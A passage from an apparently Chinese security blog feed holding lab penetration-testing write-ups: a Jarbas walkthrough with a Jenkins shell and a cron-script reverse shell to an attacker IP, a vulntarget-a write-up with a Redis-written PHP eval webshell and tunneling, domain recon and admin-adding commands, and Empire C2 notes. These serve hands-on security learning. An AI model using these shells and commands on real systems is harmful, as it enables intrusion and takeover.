bash">┌──(neil㉿kali)-[~]<br>└─$ sudo nmap -sU -p22,80,3306,8080 192.168.204.131<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-16 21:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.204.131<br>Host is up (0.00087s latency).<br><br>PORT     STATE  SERVICE<br>22/udp   closed ssh<br>80/udp   closed http<br>3306/udp closed mysql<br>8080/udp closed http-alt<br>MAC Address: 00:0C:29:77:BF:92 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.43 seconds<br><br></code></pre></td></tr></table></figure><p>简单漏扫: <code>sudo nmap --script=vuln -p22,80,3306,8080 192.168.204.131</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80,3306,8080 192.168.204.131<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-16 21:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.204.131<br>Host is up (0.00097s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-trace: TRACE is enabled<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum:</span><br><span class="hljs-string">|_  /icons/: Potentially interesting folder w/ directory listing</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">3306/tcp open  mysql</span><br><span class="hljs-string">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">8080/tcp open  http-proxy</span><br><span class="hljs-string">| http-enum:</span><br><span class="hljs-string">|_  /robots.txt: Robots file</span><br><span class="hljs-string">MAC Address: 00:0C:29:77:BF:92 (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 38.64 seconds</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="WEB页面"><a href="#WEB页面" class="headerlink" title="WEB页面"></a>WEB页面</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221116225455737.png" alt="80端口页面"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221116225530202.png" alt="8080 Jenkins"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221116225620156.png" alt="/robots.txt"></p><h3 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h3><p>对80端口目录枚举: <code>sudo gobuster dir -u http://192.168.204.131 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x html,php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.131 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x html,php<br>===============================================================<br>Gobuster v3.3<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.204.131<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.3<br>[+] Extensions:              html,php<br>[+] Timeout:                 10s<br>===============================================================<br>2022/11/16 23:07:56 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 32808]<br>/access.html          (Status: 200) [Size: 359]<br>/.html                (Status: 403) [Size: 207]<br>Progress: 66026 / 186855 (35.34%)[ERROR] 2022/11/16 23:08:09 [!] parse <span class="hljs-string">&quot;http://192.168.204.131/besalu\t.html&quot;</span>: net/url: invalid control character <span class="hljs-keyword">in</span> URL<br>[ERROR] 2022/11/16 23:08:09 [!] parse <span class="hljs-string">&quot;http://192.168.204.131/besalu\t.php&quot;</span>: net/url: invalid control character <span class="hljs-keyword">in</span> URL<br>Progress: 71267 / 186855 (38.14%)[ERROR] 2022/11/16 23:08:10 [!] parse <span class="hljs-string">&quot;http://192.168.204.131/error\x1f_log&quot;</span>: net/url: invalid control character <span class="hljs-keyword">in</span> URL<br>[ERROR] 2022/11/16 23:08:10 [!] parse <span class="hljs-string">&quot;http://192.168.204.131/error\x1f_log.html&quot;</span>: net/url: invalid control character <span class="hljs-keyword">in</span> URL<br>[ERROR] 2022/11/16 23:08:10 [!] parse <span class="hljs-string">&quot;http://192.168.204.131/error\x1f_log.php&quot;</span>: net/url: invalid control character <span class="hljs-keyword">in</span> URL<br>/.html                (Status: 403) [Size: 207]<br>/index.html           (Status: 200) [Size: 32808]<br>/.html                (Status: 403) [Size: 207]<br>Progress: 186380 / 186855 (99.75%)===============================================================<br>2022/11/16 23:08:31 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><h3 id="隐藏目录访问"><a href="#隐藏目录访问" class="headerlink" title="隐藏目录访问"></a>隐藏目录访问</h3><p><code>http://192.168.204.131/access.html</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221116231131558.png" alt="存在md5账号密码"></p><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">tiago</span>:5978a63b4654c73c60fa24f836386d87         ------&gt;</span> tiago:italia99<br><span class="hljs-function"><span class="hljs-title">trindade</span>:f463f63616cb3f1e81ce46b39f882fd5      ------&gt;</span> trindade:marianna<br><span class="hljs-function"><span class="hljs-title">eder</span>:9b38e2b1e8b12f426b0d208a7ab6cb98   ------&gt;</span> eder:vipsu<br></code></pre></td></tr></table></figure><h3 id="Jenkins登录"><a href="#Jenkins登录" class="headerlink" title="Jenkins登录"></a>Jenkins登录</h3><p>通过eder:vipsu登录成功</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221116231828656.png" alt="登录成功"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="Jenkins后台getshell方法"><a href="#Jenkins后台getshell方法" class="headerlink" title="Jenkins后台getshell方法"></a>Jenkins后台getshell方法</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221116232803647.png" alt="new item"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221116233604751.png" alt="写入shell"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221116233753457.png" alt="保存后 build now"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221116233905103.png" alt="成功反弹shell"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a>查看账号</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>bin:x:1:1:bin:/bin:/sbin/nologin<br>daemon:x:2:2:daemon:/sbin:/sbin/nologin<br>adm:x:3:4:adm:/var/adm:/sbin/nologin<br>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:5:0:<span class="hljs-built_in">sync</span>:/sbin:/bin/sync<br>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br>halt:x:7:0:halt:/sbin:/sbin/halt<br>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br>operator:x:11:0:operator:/root:/sbin/nologin<br>games:x:12:100:games:/usr/games:/sbin/nologin<br>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br>nobody:x:99:99:Nobody:/:/sbin/nologin<br>systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin<br>dbus:x:81:81:System message bus:/:/sbin/nologin<br>polkitd:x:999:997:User <span class="hljs-keyword">for</span> polkitd:/:/sbin/nologin<br>postfix:x:89:89::/var/spool/postfix:/sbin/nologin<br>chrony:x:998:996::/var/lib/chrony:/sbin/nologin<br>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br>eder:x:1000:1000:Eder Luiz:/home/eder:/bin/bash<br>apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin<br>mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin<br>jenkins:x:997:995:Jenkins Automation Server:/var/lib/jenkins:/bin/false<br></code></pre></td></tr></table></figure><h3 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br>SHELL=/bin/bash<br>PATH=/sbin:/bin:/usr/sbin:/usr/bin<br>MAILTO=root<br><br><span class="hljs-comment"># For details see man 4 crontabs</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name  command to be executed</span><br>*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1<br>bash-4.2$ <span class="hljs-built_in">ls</span> -l /etc/script/CleaningScript.sh<br><span class="hljs-built_in">ls</span> -l /etc/script/CleaningScript.sh<br>-rwxrwxrwx. 1 root root 50 Apr  1  2018 /etc/script/CleaningScript.sh<br></code></pre></td></tr></table></figure><p>可以发现<code>/etc/script/CleaningScript.sh</code>是root属主并且其他用户可以写</p><h3 id="crontab提权"><a href="#crontab提权" class="headerlink" title="crontab提权"></a>crontab提权</h3><p>写入反弹脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.204.128/4445 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/script/CleaningScript.sh<br>&lt;i &gt;&amp; /dev/tcp/192.168.204.128/4445 0&gt;&amp;1<span class="hljs-string">&quot; &gt;&gt; /etc/script/CleaningScript.sh   </span><br><span class="hljs-string">bash-4.2$ </span><br></code></pre></td></tr></table></figure><p>等待5分钟后成功getroot</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221117000620623.png" alt="提权成功"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ nc -nvlp 4445           <br>listening on [any] 4445 ...<br>connect to [192.168.204.128] from (UNKNOWN) [192.168.204.131] 44708<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>[root@jarbas ~]<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>flag.txt<br>[root@jarbas ~]<span class="hljs-comment"># cat flag.txt</span><br><span class="hljs-built_in">cat</span> flag.txt<br>Hey!<br><br>Congratulations! You got it! I always knew you could <span class="hljs-keyword">do</span> it!<br>This challenge was very easy, huh? =)<br><br>Thanks <span class="hljs-keyword">for</span> appreciating this machine.<br><br>@tiagotvrs <br>[root@jarbas ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反思</title>
    <link href="/2022/11/15/%E5%8F%8D%E6%80%9D/"/>
    <url>/2022/11/15/%E5%8F%8D%E6%80%9D/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="0cccc59ba89a03ccd3e01fabb28d57007796ac7607cc038301eaa0664048983f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>杂谈</tag>
      
      <tag>private</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulntarget-a-WP</title>
    <link href="/2022/11/05/vulntarget-a-WP/"/>
    <url>/2022/11/05/vulntarget-a-WP/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105161509440.png" alt="拓扑环境"></p><p><strong>攻击机的IP为192.168.137.123, win7外网机的IP为192.168.137.25</strong></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>主机发现</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105162750601.png" alt="192.168.137.25为目标ip"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105163406310.png" alt="image-20221105163406310"></p><ul><li>访问Web页面，发现是个通达OA</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105161848668.png" alt="通达OA页面"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li>通达OA直接工具梭哈</li><li><a href="https://github.com/xinyu2428/TDOA_RCE.git">https://github.com/xinyu2428/TDOA_RCE.git</a></li><li>需要java环境，所以通过本机写入webshell</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105162123440.png" alt="写入webshell"></p><ul><li>antSword连上</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105162252485.png" alt="发现是system权限"></p><ul><li>信息收集发现存在第二张网卡</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105162352046.png" alt="10.0.20.0/24第二个网段"></p><ul><li><p>msf生成meterpreter shell转发到kali上用</p></li><li><p>开启监听并且拿到shell</p></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105164403050.png" alt="kali拿到shell"></p><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><ul><li>直接上ew</li><li><a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></li><li>kali监听</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105163734223.png" alt="./ew_for_linux64 -s rcsocks -l 1080 -e 1234"></p><ul><li>通过antSword上传ew并且运行</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105164629739.png" alt=".\ew_for_Win.exe -s rssocks -d 192.168.137.123 -e 1234"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105164602943.png" alt="成功连接"></p><ul><li>上传fscan对内网机器进行扫描</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105172015762.png" alt="fscan扫描结果"></p><ul><li><p>针对内网主机进行更细致的扫描</p></li><li><p><code>proxychains nmap -sT -Pn -p- 10.0.20.99</code></p></li><li><p>不扫了太慢了，通过前面的扫描结果可以发现存在redis未授权访问漏洞</p></li></ul><h3 id="redis未授权写入webshell"><a href="#redis未授权写入webshell" class="headerlink" title="redis未授权写入webshell"></a>redis未授权写入webshell</h3><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span><br><span class="language-xml">config set dbfilename bad.php</span><br><span class="language-xml">set 1 &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tx&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105174035552.png" alt="redis写入shell"></p><ul><li>antSword挂上代理去连</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221105174309516.png" alt="连接成功"></p><h3 id="同上，通过上传拿到meterpreter-shell"><a href="#同上，通过上传拿到meterpreter-shell" class="headerlink" title="同上，通过上传拿到meterpreter shell"></a>同上，通过上传拿到meterpreter shell</h3><ul><li>在这里踩了个坑，直接通过proxychain给msf上代理在用正向shell出不来</li><li>还是得老老实实用路由转发<code> run post/multi/manage/autoroute</code></li></ul><p><strong>后来复现失败了 等之后有时间再来一遍</strong></p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息收集</title>
    <link href="/2022/10/29/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/10/29/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="Windows信息收集"><a href="#Windows信息收集" class="headerlink" title="Windows信息收集"></a>Windows信息收集</h2><h3 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h3><ul><li>用户列表<ul><li>分析Windows用户列表</li><li>分析邮件用户，内网&#x2F;域邮件用户</li></ul></li><li>进程列表<ul><li>分析杀毒软件&#x2F;安全监控工具等</li><li>邮件客户端</li><li>VPN等</li></ul></li><li>服务列表<ul><li>与安全防范工具有关服务[[判断是否可以手动开关等]</li><li>存在问题的服务[权限&#x2F;漏洞]</li></ul></li><li>端口列表<ul><li>开放端口对应的常见服务&#x2F;应用程序[匿名&#x2F;权限&#x2F;漏洞等]</li><li>利用端口进行信息收集，NETBIOS、SMB等</li></ul></li><li>补丁列表<ul><li>分析windows补丁</li><li>第三方软件[Java&#x2F;Oracle&#x2F;Flash等]漏洞</li></ul></li><li>本机共享<ul><li>本机共享列表&#x2F;访问权限</li><li>本机访问的域共享&#x2F;访问权限</li></ul></li><li>本地用户习惯分析<ul><li>历史记录</li><li>收藏夹</li><li>文档等</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221029141351163.png" alt="获取当前用户以及进程列表"></p><ul><li>查看是否有监控 <code>screenshot</code></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221029141729563.png" alt="查看否加入域"></p><ul><li>cmd shell 中使用<code>systeminfo</code>查看打了什么补丁<img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221029142024010.png" alt="查看补丁">+</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs powershell">查看当前用户权限: whoami /user<br><br>可知域名为和其他信息: net config workstation<br><br>查询域用户：net user /domain<br><br>添加域用户: net user ASP.NET Admin12345 /add /domain<br><br>添加域管理员: net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain admins&quot;</span> ASP.NET /add /domain<br><br>添加企业管理员: net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;enterprise admins&quot;</span> /add /domain<br><br>查询域管理员用户：net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br><br>查询域企业管理组: net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;enterprise admins&quot;</span> /domain<br><br>查询域本地管理组: net localgroup administrators /domain<br><br>查询域控制器和时间：net time /domain<br><br>查询域名称：net view /domain<br><br>查询域内计算机：net view /domain:redteam.local<br><br>查看当前域内计算机列表: net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain computers&quot;</span> /domain<br><br>查看域控机器名: net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain controllers&quot;</span> /domain<br><br>查看域密码策略: net accounts /domain<br><br>查看域信任: nltest /domain_trusts<br><br>查看某个域的域信任: nltest /domain_trusts /all_trusts /v /server:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span><br><br>通过srv记录: nslookup <span class="hljs-literal">-type</span>=SRV _ldap._tcp.corp<br></code></pre></td></tr></table></figure><ul><li>红队信息收集基础命令</li><li><a href="https://book.shentoushi.top/README.zh.html">https://book.shentoushi.top/README.zh.html</a></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221029145306076.png" alt="可知域名为和其他信息"></p>]]></content>
    
    
    
    <tags>
      
      <tag>信息收集</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过配置clash使虚拟机走代理</title>
    <link href="/2022/10/28/%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AEclash%E4%BD%BF%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%B5%B0%E4%BB%A3%E7%90%86/"/>
    <url>/2022/10/28/%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AEclash%E4%BD%BF%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%B5%B0%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h3 id="宿主机配置"><a href="#宿主机配置" class="headerlink" title="宿主机配置"></a>宿主机配置</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221028125250912.png" alt="clash配置"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221028125402756.png" alt="宿主机ip"></p><h3 id="客户机配置"><a href="#客户机配置" class="headerlink" title="客户机配置"></a>客户机配置</h3><ul><li>拿kali火狐举例，只需要将proxy设置成宿主机的所开放的clash服务就行</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221028125722656.png" alt="火狐proxy配置"></p><ul><li>成功访问google</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221028125753657.png" alt="访问成功"></p><p><strong>通过NAT模式，虚拟机代理设置成网关的ip（宿主机ip）没有成功，不知道什么原因，暂时只能用桥接来实现</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Empire</title>
    <link href="/2022/10/20/Empire/"/>
    <url>/2022/10/20/Empire/</url>
    
    <content type="html"><![CDATA[<h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><ul><li>PowersShell 和 Python 后渗透代理，主要关注客户端利用和AD部署的后利用</li><li>Windows使用Powershell；Linux和macOS使用Python</li><li>原始版本已经停止维护，BC-SECURITY继续开发维护</li></ul><h2 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h2><h3 id="安装运行"><a href="#安装运行" class="headerlink" title="安装运行"></a>安装运行</h3><ul><li><code>sudo apt install empire</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo powershell-empire server<br>sudo powershell-empire client<br></code></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li>设置账号，监听</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221020210438694.png" alt="image-20221020210438694"></p><ul><li>生成payload</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221020210610922.png" alt="image-20221020210610922"></p><ul><li>免杀上线</li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221027165747933.png" alt="image-20221027165747933"></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>后渗透测试框架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fScan源码分析</title>
    <link href="/2022/09/27/fScan%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2022/09/27/fScan%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
